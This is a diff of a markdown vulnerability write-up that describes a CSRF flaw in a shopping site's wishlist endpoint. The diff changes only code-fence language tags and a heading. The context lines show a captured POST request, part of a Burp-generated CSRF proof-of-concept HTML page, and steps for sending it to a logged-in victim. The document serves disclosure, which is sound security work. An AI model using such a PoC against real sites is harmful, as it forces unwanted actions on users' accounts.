@@ -8,7 +8,7 @@ I found that website acts weirdly when I perform CSRF.
 **On attacker:**
 We create a simple account and capture the request on Burp when we add a product to our wishlist.
 
-```
+```http
 POST /service/wishlist/wishlist HTTP/1.1
 Host: www.example-website.nl
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
@@ -28,7 +28,7 @@ Cookie: fsrn=2; fsreset2=Wed_18_Mar_2020_22_54_40_GMT; identifier=4339d3b6-2610-
 
 Using this request, we generate a CSRF PoC. (again using Burp Suite)
 
-```
+```html
 <html>
   <body>
   <script>history.pushState('', '', '/')</script>
@@ -45,7 +45,7 @@ Send the generated HTML to the victim.
 **On victim**
 Open the file received from attacker (while he is already logged in the website). The product will be added on the wishlist.
 
-##Impact
+## Impact
 
 The attacker can perform different unwanted action on user, such as buying products, add/remove products from wishlist and so on.
 
